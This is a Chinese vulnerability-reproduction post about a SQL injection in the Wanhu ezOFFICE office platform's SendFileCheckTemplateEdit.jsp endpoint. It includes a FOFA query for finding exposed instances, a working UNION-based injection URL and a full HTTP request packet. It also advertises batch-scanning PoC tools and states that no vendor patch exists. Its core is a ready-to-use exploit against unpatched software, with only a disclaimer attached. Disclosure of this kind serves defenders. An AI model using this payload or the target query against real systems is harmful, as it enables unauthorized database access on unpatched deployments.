#  ​万户协同办公平台ezoffice SendFileCheckTemplateEdit.jsp接口存在SQL注入漏洞 附POC   
原创 南风徐来  南风漏洞复现文库   2023-11-28 23:16  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 万户协同办公平台ezoffice接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
万户ezOFFICE集团版协同平台以工作流程、知识管理、沟通交流和辅助办公四大核心应用  
## 2.漏洞描述  
  
万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice SendFileCheckTemplateEdit.jsp接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcY00lXPXCDGrNbV8lDraWmudv8tUticEwnZYMkd4YsgBlcLxr6Kiawg0fg/640?wx_fmt=jpeg&from=appmsg "null")  
  
万户协同办公平台ezoffice SendFileCheckTemplateEdit.jsp接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
"Ezoffice"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--  
  
漏洞数据包：  
```
GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36
Accept: */*
Connection: close
Accept-Language: en
Accept-Encoding: gzip
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYpicdWZHwKicptrTJr27k1P69z0g0GL97rhyCiaF2yEA4g2FHe0nUMRN1Q/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
**本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYaeNnv3icSdyD1UUMhuj2AqatBBZlvFPoYzwvc3L72E6rWZd6UNicAOBw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYaHR2Tb3vrrXyeE57dXlHUibSUByxib1YBNpibmiatwQWwSuXEfVQaBcBiag/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcY9ibdibKPUcznFe7s5YrTE6CwNR4FeohSDBYKADFDBS8eHz1eazibOjmlQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修补方案，请关注厂商主页及时更新： http://www.whir.net  
## 8.往期回顾  
  
[亿赛通电子文档安全管理系统UploadFileFromClientServiceForClient接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484633&idx=1&sn=564b1d5a595d7361fd8bdc358266e647&chksm=974b89dea03c00c83d2194779fdf96bd3a770825c66316a4ddfdbf1a16869543cd3ccef6fb1f&scene=21#wechat_redirect)  
  
  
[鸿运主动安全监控云平台存在任意文件读取漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484618&idx=1&sn=d6afb834049f84a076ae1e3ce9acbfeb&chksm=974b89cda03c00db68ac96ec70e3b01776af8c3e93a4291da32bcfe22393e8b993a9abe87007&scene=21#wechat_redirect)  
  
  
  
  
